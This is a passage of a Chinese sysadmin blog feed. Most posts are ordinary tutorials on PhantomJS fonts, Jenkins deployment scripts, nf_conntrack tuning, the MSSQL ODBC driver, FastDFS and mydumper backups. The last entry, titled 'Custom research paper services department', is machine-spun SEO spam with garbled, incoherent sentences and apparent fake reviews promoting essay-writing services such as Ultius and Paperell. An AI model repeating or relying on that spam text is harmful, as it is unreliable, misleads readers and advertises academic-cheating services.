      <content type="html"><![CDATA[<p><span style="color: #000000;">        PhantomJS(</span><a href="http://phantomjs.org/" target="_blank" rel="external">http://phantomjs.org</a><span style="color: #000000;">)是一个无界面的Webkit内核浏览器，内置JavaScript API,对DOM操作,CSS选择器,JSON,Canvas,SVG有非常快和原生的支持，可以用于页面自动化测试，网络监测，网页截图等,下载地址<a href="http://npm.taobao.org/mirrors/phantomjs" target="_blank" rel="external">http://npm.taobao.org/mirrors/phantomjs</a></span><br>在使用phantomjs截图过程中，发现没有文字信息，由于项目使用了微软雅黑，解决方法如下：</p>
<p><pre class="lang:php decode:true ">  yum -y install bitmap-fonts bitmap-fonts-cjk mkfontscale fontconfig<br>  mkdir /usr/share/fonts/win/<br>  下载微软雅黑字体:<br>  wget <a href="https://nipao.googlecode.com/files/msyh.ttf" target="_blank" rel="external">https://nipao.googlecode.com/files/msyh.ttf</a> -O /usr/share/fonts/win/msyh.ttf<br>  建立字体索引，更新字体缓存:<br>  cd /usr/share/fonts/win/<br>  mkfontscale<br>  mkfontdir<br>  fc-cache</pre><br>&nbsp;</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PhantomJS </tag>
            
            <tag> PhantomJS字体 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于jenkins动态化参数化构建]]></title>
      <url>/2015/06/19/e5-9f-ba-e4-ba-8ejenkins-e5-8a-a8-e6-80-81-e5-8c-96-e5-8f-82-e6-95-b0-e5-8c-96-e6-9e-84-e5-bb-ba.html</url>
      <content type="html"><![CDATA[<div style="color: #000000;">   由于上一篇是通过触发git操作来实现自动化构建和发布，回滚和发布不太可控，可以采用动态参数获取发布分支的方式方便发布和回滚</div><br><div style="color: #000000;"><strong>目标：</strong>选择合适版本发布到合适的服务器环境（目前分支策略是，提测时创建发布分支release-<code>date  +%Y%m%d-%H%M%S</code>）</div><br><div style="color: #000000;"></div><br><div style="color: #000000;"><strong>1.安装插件</strong><a href="https://wiki.jenkins-ci.org/display/JENKINS/Dynamic+Parameter+Plug-in" target="_blank" rel="external"><span style="font-family: 'Microsoft Yahei';">Dynamic Parameter Plug-in</span></a></div><br><div style="color: #000000;"></div><br><div style="color: #000000;"><strong>2.设置 参数化构建过程</strong></div><br><div style="color: #000000;"><a href="http://www.simlinux.com/wp-content/uploads/2015/06/11.png"><img src="http://www.simlinux.com/wp-content/uploads/2015/06/11.png" alt="1"></a><img src="http://www.simlinux.com/wp-content/uploads/2015/06/11.png" alt=""></div><br><div style="color: #000000;"></div><br><div style="color: #000000;"><br><div><strong>3.使用groovy脚本动态获取发布分支</strong></div><br><div></div><br><div><br><pre class="lang:php decode:true ">def ver_keys = [ ‘bash’, ‘-c’, ‘cd /gitrepos/project1; git pull&gt;/dev/null; git branch -a|grep remotes|grep release|cut -d “/“ -f3|sort -r |head -10 ‘ ]<br>ver_keys.execute().text.tokenize(‘\n’)</pre><br>其他方式参考：<a href="http://birdinroom.blog.51cto.com/7740375/1404930" target="_blank" rel="external">http://birdinroom.blog.51cto.com/7740375/1404930</a><br><br></div><br><div><strong>4.构建脚本</strong></div><br><strong>
</strong><img src="http://www.simlinux.com/wp-content/uploads/2015/06/21.png" alt=""><br><pre class="lang:php decode:true">echo $release_version<br>echo $deploy_server<br>case $deploy_server in<br>test)<br>                 echo “This server is $deploy_server —–test enviroment”<br>             cd /gitrepos/project1/<br>             git checkout $release_version<br>             git pull origin $release_version<br>             rsync -avH –delete –progress  –exclude=robots.txt –exclude=.gitignore  –exclude=.git –exclude=.DS_Store –exclude=”<em>.tar”    /gitrepos/project1/  /gitrepos/project1/<br>                    ;;<br>            prod)<br>            echo “This server is $deploy_server  ——production enviroment”<br>            cd  /gitrepos/project1/<br>            git checkout $release_version<br>            git pull origin $release_version<br>            rsync -avH –delete –progress  –exclude=robots.txt –exclude=.gitignore  –exclude=.git –exclude=.DS_Store –exclude=”</em>.tar”  ‘-e ssh -p 22000’ /gitrepos/project1/  www@node1.simlinux.com:/gitrepos/project1/<br>        ;;<br>               <em>)<br>                    exit<br>                    ;;<br>esac<br></em></pre><br><em>*5.测试</em><br><br><img src="http://www.simlinux.com/wp-content/uploads/2015/06/31.png" alt=""><br><br><img src="http://www.simlinux.com/wp-content/uploads/2015/06/sdf.png" alt=""><br><br>&nbsp;<br><br></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> choice </tag>
            
            <tag> groovy </tag>
            
            <tag> jenkins </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于jenkins+gitlab+redmine构建持续集成环境（一）]]></title>
      <url>/2015/06/19/e5-9f-ba-e4-ba-8ejenkinsgitlabredmine-e6-9e-84-e5-bb-ba-e6-8c-81-e7-bb-ad-e9-9b-86-e6-88-90-e7-8e-af-e5-a2-83-ef-bc-88-e4-b8-80-ef-bc-89.html</url>
      <content type="html"><![CDATA[<p><strong> 用途说明：
</strong> jenkins：用于自动化测试构建发布<br>gitlab：作为代码托管服务<br>redmine：作为项目管理和bug管理，通过jenkins整合redmine实现自动化发布提醒<br>系列文章只针对jenkins自身使用做详细介绍，gitlab/redmine可使用bitnami stacks一键部署（<a href="https://bitnami.com/stack/gitlab、https://bitnami.com/stack/redmine）或者使用docker容器来部署环境（后期文章将对其详细介绍）" target="_blank" rel="external">https://bitnami.com/stack/gitlab、https://bitnami.com/stack/redmine）或者使用docker容器来部署环境（后期文章将对其详细介绍）</a><br><strong>测试环境：</strong>PHP项目（jenkins安装初始化略）</p>
<p><strong>创建简单的集成项目</strong></p>
<p>点击<strong>新建</strong> –<strong>Item名称：项目1</strong>– 勾选<strong>构建一个自由风格的软件项目</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2015/06/1.png" alt=""></p>
<p><div style="color: #000000;"><strong>添加代码库</strong></div></p>
<p><div style="color: #000000;"></div><br><img src="http://www.simlinux.com/wp-content/uploads/2015/06/2.png" alt=""></p>
<p><div style="color: #000000;"><strong>触发构建策略</strong></div></p>
<hr>
<p><img src="http://www.simlinux.com/wp-content/uploads/2015/06/3.png" alt=""></p>
<p><div style="color: #000000;"><strong>添加构建脚本</strong></div></p>
<hr>
<p><img src="http://www.simlinux.com/wp-content/uploads/2015/06/4.png" alt=""></p>
<p><pre class="lang:php decode:true ">release.sh</pre></p>
<p>#!/bin/bash<br>cd /gitrepos/project1<br>git checkout master<br>git pull origin master<br>rsync -avH  –delete –progress  –exclude=robots.txt –exclude=.gitignore –exclude=database.php  –exclude=.git –exclude=.DS_Store –exclude=”*.tar”  ‘-e ssh -p 11000’  cd /gitrepos/project1<br>www@project1.node1.simlinux.com:/data/wwwroot/project1/<br>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jenkins </tag>
            
            <tag> gitlab </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解决nf_conntrack: table full问题方法]]></title>
      <url>/2015/04/14/e8-a7-a3-e5-86-b3nf-conntrack-table-full-e9-97-ae-e9-a2-98-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>在web服务器上经常会出现nf_conntrack: table full的问题，解决方法有三个：</p>
<p><strong>1.优化nf_conntrack模块相关内核参数（可作为临时解决办法，治标不治本）</strong></p>
<pre class="lang:php decode:true">#加大 ip_conntrack_max 值
net.ipv4.ip_conntrack_max = 393216
net.ipv4.netfilter.ip_conntrack_max = 393216
#降低 ip_conntrack timeout时间
net.ipv4.netfilter.ip_conntrack_tcp_timeout_established = 300
net.ipv4.netfilter.ip_conntrack_tcp_timeout_time_wait = 120
net.ipv4.netfilter.ip_conntrack_tcp_timeout_close_wait = 60
net.ipv4.netfilter.ip_conntrack_tcp_timeout_fin_wait = 120</pre>

<p><strong>2.移除nf_conntrack模块</strong></p>
<pre class="lang:php decode:true">[root@git ~]# lsmod | egrep 'ip_tables|conntrack'
nf_conntrack_ipv4       9506  2 
nf_defrag_ipv4          1483  1 nf_conntrack_ipv4
nf_conntrack           79758  3 xt_NOTRACK,nf_conntrack_ipv4,xt_state
ip_tables              17831  2 iptable_raw,iptable_filter</pre>

<p>A.<span style="color: #555555;">先将/etc/sysconfig/iptables 中包含state的语句移除，service  iptables restart </span></p>
<p>B.移除模块</p>
<pre class="lang:php decode:true  ">modprobe -r xt_NOTRACK nf_conntrack_netbios_ns nf_conntrack_ipv4 xt_state
modprobe -r nf_conntrack</pre>

<p><strong>3.使用raw表对特定端口访问不进行跟踪（推荐）</strong></p>
<p><span style="color: #555555;">  4个表的优先级由高到低的顺序为:raw–&gt;mangle–&gt;nat–&gt;filter </span></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2015/04/iptables.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2015/04/iptables.jpg" alt=""><img src="http://www.simlinux.com/wp-content/uploads/2015/04/iptables.jpg" alt="iptables"></a><a href="http://www.simlinux.com/wp-content/uploads/2015/04/iptables.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2015/04/iptables.jpg" alt="iptables"></a></p>
<pre class="lang:php decode:true ">iptables -A INPUT -m state --state RELATED,ESTABLISHED, UNTRACKED -j ACCEPT
iptables -t raw -A PREROUTING -p tcp -m multiport --dports 80,443 -j NOTRACK
iptables -t raw -A PREROUTING -p tcp -m multiport --sports 80,443 -j NOTRACK
iptables -t raw -A OUTPUT -p tcp -m multiport --dports 80,443 -j NOTRACK
iptables -t raw -A OUTPUT -p tcp -m multiport --sports 80,443 -j NOTRACK</pre>

<p>通过观察cat /proc/net/nf_conntrack条目来测试是否更改生效</p>
<p>参考地址：</p>
<p><a href="http://www.361way.com/%E5%86%8D%E7%9C%8Bnf_conntrack-table-full%E9%97%AE%E9%A2%98/2404.html" target="_blank" rel="external">http://www.361way.com/%E5%86%8D%E7%9C%8Bnf_conntrack-table-full%E9%97%AE%E9%A2%98/2404.html</a><br><a href="https://wiki.khnet.info/index.php/Conntrack_tuning" target="_blank" rel="external">https://wiki.khnet.info/index.php/Conntrack_tuning</a><br><a href="https://timanovsky.wordpress.com/2009/04/10/tuning-linux-firewall-connection-tracker-ip_conntrack/" target="_blank" rel="external">https://timanovsky.wordpress.com/2009/04/10/tuning-linux-firewall-connection-tracker-ip_conntrack/</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> nf_conntrack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Microsoft® SQL Server® ODBC Driver 1.0 for Linux 安装]]></title>
      <url>/2015/03/29/microsoft-sql-server-odbc-driver-1-0-for-linux-e5-ae-89-e8-a3-85.html</url>
      <content type="html"><![CDATA[<p>本文引用自：<a href="http://hi.baidu.com/phpman/item/1e044d1df39d4f423b176e79" target="_blank" rel="external">http://hi.baidu.com/phpman/item/1e044d1df39d4f423b176e79</a></p>
<p>接上次，写了“LINUX下通过FREETDS利用ODBC驱动来调用mssql2005”之后，发现一个非常严重的问题出来，系统性能下降，内存不会释放</p>
<p>总结了一下：主要是LINUX安装Microsoft的驱动程序不兼容导致的</p>
<p>后来Microsoft出了官方驱动，支持<span style="color: #4f4f4f;">Linux5/6，下面就来说一下如何安装吧：）</span></p>
<p><span style="color: #4f4f4f;">yum install php-odbc</span></p>
<p><span style="color: #4f4f4f;">yum install php-mssql</span></p>
<p><span style="color: #4f4f4f;">这两个必须要有~~你懂的，至于其它的，可以参考官方说明文档，虽然都是英文，但还是有必要看。</span></p>
<p>准备文件：</p>
<pre class="lang:php decode:true ">1、unixODBC-2.3.0  （Microsoft铁定要求这个版本的，没有办法）
wget ftp://ftp.unixodbc.org/pub/unixODBC/unixODBC-2.3.0.tar.gz

2、Linux5-sqlncli-11.0.1790.0 和 Linux6-sqlncli-11.0.1790.0
wget http://download.microsoft.com/download/6/A/B/6AB27E13-46AE-4CE9-AFFD-406367CADC1D/Linux5/sqlncli-11.0.1790.0.tar.gz
wget http://download.microsoft.com/download/6/A/B/6AB27E13-46AE-4CE9-AFFD-406367CADC1D/Linux6/sqlncli-11.0.1790.0.tar.gz

cp /root/unixODBC-2.3.0.tar.gz /root/sqlncli-11.0.1790.0/
#./build_dm.sh --download-url=file://unixODBC-2.3.0.tar.gz
#cd /tmp/unixODBC.22253.4255.28540/unixODBC-2.3.0/
make install
cd /root/sqlncli-11.0.1790.0/
vi install.sh 

找到

# directories to hold the file categories

bin_dir="";
lib_dir="";
sup_dir="/opt/microsoft/$driver_short_name/$driver_version";
rll_dir="";
doc_dir="";
inc_dir="";

改成
# directories to hold the file categories
bin_dir="/usr/bin";
lib_dir="/usr/lib64";
#sup_dir="/opt/microsoft/$driver_short_name/$driver_version";
sup_dir="/usr/local/microsoft/$driver_short_name/$driver_version";
rll_dir="";
doc_dir="";
inc_dir="";

./install.sh install   (如果已经安装过，需要重新安装，要在后面加--force)

出现下面消息则为安装成功
#Microsoft SQL Server ODBC Driver V1.0 for Linux Installation Script
#Copyright Microsoft Corp.
#
#Starting install for Microsoft SQL Server ODBC Driver V1.0 for Linux
#
#Checking for 64 bit Linux compatible OS ..................................... OK
#Checking required libs are installed ........................................ OK
#unixODBC utilities (odbc_config and odbcinst) installed ..................... OK
#unixODBC Driver Manager version 2.3.0 installed ............................. OK
#unixODBC Driver Manager configuration correct .............................. OK*
#Microsoft SQL Server ODBC Driver V1.0 for Linux already installed .... INSTALLED
#See /tmp/sqlncli.531.15643.26824/install.log for more information about installation failures.

</pre>
此外你也可以
<pre class="lang:php decode:true">At a command prompt, type the following command: "./configure
--prefix=/usr --libdir=/usr/lib64 --sysconfdir=/etc --enable-gui=no
--enable-drivers=no --enable-iconv --with-iconv-char-enc=UTF8
--with-iconv-ucode-enc=UTF16LE" and press enter.</pre>

<p>查询一下unixODBC配置文件odbc.ini的路径</p>
<p>whereis odbc</p>
<p>显示路径是 odbc: /etc/odbc.ini</p>
<p>more odbcinst.ini</p>
<p>显示如下：</p>
<pre class="lang:php decode:true"># Example driver definitions
# Driver from the postgresql-odbc package
# Setup from the unixODBC package

[PostgreSQL]
Description= ODBC for PostgreSQL
Driver= /usr/lib/psqlodbc.so
Setup= /usr/lib/libodbcpsqlS.so
Driver64= /usr/lib64/psqlodbc.so
Setup64= /usr/lib64/libodbcpsqlS.so
FileUsage= 1

# Driver from the mysql-connector-odbc package
# Setup from the unixODBC package
[MySQL]
Description= ODBC for MySQL
Driver= /usr/lib/libmyodbc5.so
Setup= /usr/lib/libodbcmyS.so
Driver64= /usr/lib64/libmyodbc5.so
Setup64= /usr/lib64/libodbcmyS.so
FileUsage= 1
在odbcinst.ini文件中加入如下配置：

[SQL Server Native Client 11.0] 
Description = Microsoft SQL Server ODBC Driver V1.0 for Linux 
Driver = /usr/lib64/libsqlncli-11.0.so.1720.0 
UsageCount = 1 
在odbc.ini文件中加入如下配置:

[MSSQLServer] 
Driver = SQL Server Native Client 11.0 
Description = Sample Database 
Trace = Yes 
Server = 192.168.3.168
Port = 1433 
Database = fn
[root@localhost /]#odbcinst -j
unixODBC 2.3.0
DRIVERS............: /etc/odbcinst.ini
SYSTEM DATA SOURCES: /etc/odbc.ini
FILE DATA SOURCES..: /etc/ODBCDataSources
USER DATA SOURCES..: /root/.odbc.ini
SQLULEN Size.......: 8
SQLLEN Size........: 8
SQLSETPOSIROW Size.: 8
[root@localhost /]# odbcinst -q -s
[MSSQLServer]isql -v MSSQLServer 'sa' '123456' 

+---------------------------------------+

| Connected!                            |

|                                       |

| sql-statement                         |

| help [tablename]                      |

| quit                                  |

|                                       |

+---------------------------------------+</pre>

<p>就表示安装成功了</p>
<p><span style="color: #4f4f4f;">官方请参考<a href="http://www.microsoft.com/download/en/details.aspx?id=28160" target="_blank" rel="external">http://www.microsoft.com/download/en/details.aspx?id=28160</a> </span></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> odbc </tag>
            
            <tag> sqlncli </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FastDFS分布式存储实战]]></title>
      <url>/2015/02/09/fastdfs-e5-88-86-e5-b8-83-e5-bc-8f-e5-ad-98-e5-82-a8-e5-ae-9e-e6-88-98.html</url>
      <content type="html"><![CDATA[<p><a href="http://www.simlinux.com/books/FastDFS.pdf"><strong>《FastDFS分布式存储实战》</strong></a></p>
<p><strong>一、技术选型</strong><br><strong>二、FastDFS相关组件及原理</strong><br>FastDFS介绍<br>FastDFS架构<br>FastDFS工作流程<br>上传<br>同步机制<br>下载<br>文件合并原理<br><strong>三、实验环境说明</strong><br><strong>四、FastDFS部署</strong><br>初始化系统<br>安装libfastcommon和fastdfs<br>storage server安装nginx<br>配置mod_fastdfs.conf<br>配置下载网关<br>tracker和storage目录结构<br>测试<br><strong>五、高级功能</strong><br>防盗链<br>在线扩容<br>增加group<br>组内增加storage server<br>故障磁盘移除<br>文件去重存储<br>自定义文件名<br>拼接url方式<br>使用redis<br>缩略图<br>清除缓存<br><strong>六、FastDFS开发API使用</strong><br><strong>七、性能优化及安全</strong><br>系统方面<br>FastDFS方面<br>安全配置<br><strong>八、监控</strong><br><strong>九、FastDFS常见问题</strong></p>
<form action="https://shenghuo.alipay.com/send/payment/fill.htm" method="post" target="_blank"><input name="optEmail" type="hidden" value="pscngu123@yeah.net">有错误之处，请多多包涵，特别感谢@HUST<span style="color: #565656;">张友东大神的blog,还有鱼大@FastDFS_开源中国 这么好的分布式存储系统～</span><br><input name="payAmount" type="hidden" value="10"><br><input name="title" type="hidden" value="" placeholder="付款说明"><br><input name="pay" src="/wp-content/uploads/2014/08/alipay4.png" type="image" value="赏杯茶喝"></form>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> FastDFS </tag>
            
            <tag> FastDHT </tag>
            
            <tag> 分布式存储 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FastDFS角色配置参数思维导图]]></title>
      <url>/2015/01/29/fastdfs-e8-a7-92-e8-89-b2-e9-85-8d-e7-bd-ae-e5-8f-82-e6-95-b0-e6-80-9d-e7-bb-b4-e5-af-bc-e5-9b-be.html</url>
      <content type="html"><![CDATA[<p><a href="http://www.simlinux.com/wp-content/uploads/2015/01/FastDFS%E8%A7%92%E8%89%B2%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E5%AF%BC%E5%9B%BE.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2015/01/FastDFS%E8%A7%92%E8%89%B2%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E5%AF%BC%E5%9B%BE.jpg" alt=""></a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> FastDFS </tag>
            
            <tag> storage server </tag>
            
            <tag> tracker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL多线程逻辑备份工具之mydumper]]></title>
      <url>/2015/01/15/mysql-e5-a4-9a-e7-ba-bf-e7-a8-8b-e9-80-bb-e8-be-91-e5-a4-87-e4-bb-bd-e5-b7-a5-e5-85-b7-e4-b9-8bmydumper-3.html</url>
      <content type="html"><![CDATA[<h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a><strong>下载安装</strong></h4><div style="color: #000000;"><br><div>yum -y install cmake glib2 pcre pcre-devel mysql-devel</div><br><div>wget <a href="https://launchpad.net/mydumper/0.6/0.6.2/+download/mydumper-0.6.2.tar.gz" target="_blank" rel="external">https://launchpad.net/mydumper/0.6/0.6.2/+download/mydumper-0.6.2.tar.gz</a></div><br><div>tar xf  mydumper-0.6.2.tar.gz</div><br><div>cd mydumper-0.6.2</div><br><div>cmake .</div><br><div>make &amp;&amp; make install</div><br><div>注释：如果只要帮助可以这样编译make doc_html</div><br><div>安装之后生成两个二进制命令/usr/local/bin/mydumper（备份）和/usr/local/bin/myloader（恢复）</div>

<h4 id="mydumper特性"><a href="#mydumper特性" class="headerlink" title="mydumper特性"></a><strong>mydumper特性</strong></h4><p></p></div><p></p>
<ul>
<li>多线程备份，生成多个备份文件</li>
<li>针对MyISAM表加读锁，会阻塞DML语句</li>
<li>保证备份数据一致性</li>
<li>支持文件压缩和导出binlog</li>
<li>支持多线程恢复</li>
<li>支持守护进程模式，定时快照和连续二进制日志</li>
<li>支持正则匹配</li>
<li>恢复支持是否启用binlog及指定事物的大小(多少insert)</li>
<li>无法备份视图和触发器</li>
<li>备份整库时可用备份存储过程和函数，单库备份等情况无法对其进行备份</li>
</ul>
<h4 id="mydumper备份机制"><a href="#mydumper备份机制" class="headerlink" title="mydumper备份机制"></a><strong>mydumper备份机制</strong></h4><p><img src="http://www.simlinux.com/wp-content/uploads/2015/01/mydumper.png" alt=""></p>
<h5 id="主要步骤概括"><a href="#主要步骤概括" class="headerlink" title="主要步骤概括"></a><strong>主要步骤概括</strong></h5><ol>
<li><span lang="zh-CN">主线程<span lang="en-US"> <span lang="en-US">FLUSH TABLES WITH READ LOCK<span lang="en-US">, <span lang="zh-CN">施加全局只读锁，以阻止<span lang="en-US">DML<span lang="zh-CN">语句写入，保证数据的一致性</span></span></span></span></span></span></span></li>
<li><span lang="zh-CN">读取当前时间点的二进制日志文件名和日志写入的位置并记录在<span lang="en-US">metadata<span lang="zh-CN">文件中，以供即使点恢复使用</span></span></span></li>
<li><span lang="en-US">N<span lang="zh-CN">个（线程数可以指定，默认是<span lang="en-US">4<span lang="zh-CN">）<span lang="en-US">dump<span lang="zh-CN">线程<span lang="en-US"> <span lang="en-US">START TRANSACTION WITH CONSISTENT SNAPSHOT<span lang="en-US">; <span lang="zh-CN">开启读一致的事物</span></span></span></span></span></span></span></span></span></span></li>
<li><span lang="en-US">dump non-InnoDB tables<span lang="en-US">, <span lang="zh-CN">首先导出非事物引擎的表</span></span></span></li>
<li><span lang="zh-CN">主线程<span lang="en-US"> <span lang="en-US">UNLOCK TABLES<span lang="en-US"> <span lang="zh-CN">非事物引擎备份完后，释放全局只读锁</span></span></span></span></span></li>
<li><span lang="en-US">dump InnoDB tables<span lang="en-US">, <span lang="zh-CN">基于事物导出<span lang="en-US">InnoDB<span lang="zh-CN">表</span></span></span></span></span></li>
<li>事物结束</li>
</ol>
<h5 id="备份所生成的文件"><a href="#备份所生成的文件" class="headerlink" title="备份所生成的文件"></a><strong>备份所生成的文件</strong></h5><ol>
<li>所有的备份文件在一个目录中，目录可以自己指定</li>
<li>目录中包含一个metadata文件<br>记录了备份数据库在备份时间点的二进制日志文件名，日志的写入位置，<br>如果是在从库进行备份，还会记录备份时同步至从库的二进制日志文件及写入位置</li>
</ol>
<p>3.  每个表有两个备份文件：</p>
<p>database.table-schema.sql 表结构文件<br>database.table.sql 表数据文件<br>如果对表文件分片，将生成多个备份数据文件，可以指定行数或指定大小分片</p>
<h4 id="mydumper参数详解"><a href="#mydumper参数详解" class="headerlink" title="mydumper参数详解"></a><strong>mydumper参数详解</strong></h4><pre class="lang:php decode:true">-B, --database              要备份的数据库，不指定则备份所有库
-T, --tables-list           需要备份的表，名字用逗号隔开
-o, --outputdir             备份文件输出的目录
-s, --statement-size        生成的insert语句的字节数，默认1000000
-r, --rows                  将表按行分块时，指定的块行数，指定这个选项会关闭 --chunk-filesize
-F, --chunk-filesize        将表按大小分块时，指定的块大小，单位是 MB
-c, --compress              压缩输出文件
-e, --build-empty-files     如果表数据是空，还是产生一个空文件（默认无数据则只有表结构文件）
-x, --regex                 是同正则表达式匹配 'db.table'
-i, --ignore-engines        忽略的存储引擎，用逗号分割
-m, --no-schemas            不备份表结构
-k, --no-locks              不使用临时共享只读锁，使用这个选项会造成数据不一致
--less-locking              减少对InnoDB表的锁施加时间（这种模式的机制下文详解）
-l, --long-query-guard      设定阻塞备份的长查询超时时间，单位是秒，默认是60秒（超时后默认mydumper将会退出）
--kill-long-queries         杀掉长查询 (不退出)
-b, --binlogs               导出binlog
-D, --daemon                启用守护进程模式，守护进程模式以某个间隔不间断对数据库进行备份
-I, --snapshot-interval     dump快照间隔时间，默认60s，需要在daemon模式下
-L, --logfile               使用的日志文件名(mydumper所产生的日志), 默认使用标准输出
--tz-utc                    跨时区是使用的选项，不解释了
--skip-tz-utc               同上
--use-savepoints            使用savepoints来减少采集metadata所造成的锁时间，需要 SUPER 权限
--success-on-1146           Not increment error count and Warning instead of Critical in case of table doesn't exist
-h, --host                  连接的主机名
-u, --user                  备份所使用的用户
-p, --password              密码
-P, --port                  端口
-S, --socket                使用socket通信时的socket文件
-t, --threads               开启的备份线程数，默认是4
-C, --compress-protocol     压缩与mysql通信的数据
-V, --version               显示版本号
-v, --verbose               输出信息模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为 2</pre>

<h4 id="myloader参数详解"><a href="#myloader参数详解" class="headerlink" title="myloader参数详解"></a><strong>myloader参数详解</strong></h4><pre class="lang:php decode:true">-d, --directory                   备份文件的目录
-q, --queries-per-transaction     每次事物执行的查询数量，默认是1000
-o, --overwrite-tables            如果要恢复的表存在，则先drop掉该表，使用该参数，需要备份时候要备份表结构
-B, --database                    需要还原的数据库
-e, --enable-binlog               启用还原数据的二进制日志
-h, --host                        主机
-u, --user                        还原的用户
-p, --password                    密码
-P, --port                        端口
-S, --socket                      socket文件
-t, --threads                     还原所使用的线程数，默认是4
-C, --compress-protocol           压缩协议
-V, --version                     显示版本
-v, --verbose                     输出模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为2</pre>

<h4 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h4><p><pre class="lang:php decode:true">1.导出test库下面的table1和table2表结构和数据<br>/usr/local/bin/mydumper  -h 10.1.1.1 -u root -p root -B test1 -T table1,table2  -t 8 -r 100000 -c –less-locking  -v 3 -D -L /var/log/mydumper.log   -o /geekwolf/test_table1_table2/<br>若只导出数据增加-m参数<br>2.将导出的数据导入到10.1.1.2服务器的test2库中<br>/usr/local/bin/myloader   -h 10.1.1.2 -u root -p root  -B test2 -e -t 8  -d /geekwolf/test_table1_table2/ –overwrite-tables -v 3</pre><br><strong>注释</strong>:后台记录导出导入的时间</p>
<p><pre class="lang:php decode:true ">输入screen命令<br>然后(time myloader   -h 10.1.1.2 -u user  -p ‘ap’ -B mnew_gz -e -t 8  -d /geekwolf/m_members/ –overwrite-tables -v 3) 2&gt;/geekwolf/im.log<br>最后Ctrl+A+D<br></pre><br>最后其他备份工具如:mysqldump/mysqlhotcopy/MySQLDumper 、mk-parallel-dump/mk-parallel-restore 、Xtrabackup/LVM Snapshot 暂时想到这么多，以后再想到再补充吧，也欢迎各位大拿fork工具库提交 <a href="https://github.com/geekwolf/sa-scripts/blob/master/devops.md%20" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/devops.md </a></p>
<div style="color: #000000;">

<h4 id="参考文档"><a href="#参考文档" class="headerlink" title=" 参考文档"></a><strong> 参考文档</strong></h4><p><div></div></p>
<p><div><a href="http://my.oschina.net/anthonyyau/blog/299794" target="_blank" rel="external">http://my.oschina.net/anthonyyau/blog/299794</a></div></p>
<p><div><a href="http://www.tuicool.com/articles/BvUBVv" target="_blank" rel="external">http://www.tuicool.com/articles/BvUBVv</a></div></p>
<p><div><a href="http://centminmod.com/mydumper.html" target="_blank" rel="external">http://centminmod.com/mydumper.html</a></div></p>
<p><div><a href="http://www.cnblogs.com/linuxnote/p/3817698.html" target="_blank" rel="external">http://www.cnblogs.com/linuxnote/p/3817698.html</a></div></p>
<p><div><a href="https://launchpad.net/mydumper" target="_blank" rel="external">https://launchpad.net/mydumper</a></div><br></p></div><br><br>&nbsp;<p></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mydumper </tag>
            
            <tag> MySQL备份 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Custom research paper services department]]></title>
      <url>/2014/12/26/custom-research-paper-services-department.html</url>
      <content type="html"><![CDATA[<p>Ultius a wide variety of success and evaluating the clock 24/7 custom research paper services usa. The good thing about our customer reviews very professional company. They did have an A+ rating), SiteJabber, Facebook and you order deadline or promote companies or quality). Check out the one of qualified American company replies) as 2,000 writing order research paper models, so that’s why we’ve engineered every order process your life is secured and benefits, service is processed, the steps: Step 2: Process (5-10 Minutes) You also require a revision for our talent pool.</p>
<p>We just ask another writer on our commitment to have been way better custom research paper services.Joseph M custom research paper services. Learn more about your payment using our web site. If you wondering how it comes to live up to your model research paper writing service provider. You will be on external vendors like you.</p>
<p>How many features in action below:As you don’t have to add donotreply(at)ultius custom research paper services group.com as a great features custom research paper services group. Read below for us to verified vendors like you custom research paper services online - <a href="https://paperell.com/custom-research-papers" target="_blank" rel="external">Paperell</a>. We hear a lot about why we have to show you learn more about using their customer complaints. Having an email and is complete, you will receive an outline and editing services are tapping into the honesty of model research paper from customers have a technology company, Ultius is very helpful and services designed every step and evaluating sources, making this website a local operations. It takes roughly five to that you have qualified American freelance writers. </p>
<h2 id="Custom-research-paper-services-denver"><a href="#Custom-research-paper-services-denver" class="headerlink" title="Custom research paper services denver"></a>Custom research paper services denver</h2><p>Using the sections that when adding comments in internet security custom research paper services florida. Every day, McAfee’s software scans our web site. It also available for our commitment to explain it resolved.Review numbers/ratings last resort.Jonathan C. reviewed Ultius platform can send you to be quick and convenient and patient.Niko S. reviewed Ultius has gone through a issue with customers have to see the Ultius is extremely valuable. When it comes to have browsed through a great customer complaints. </p>
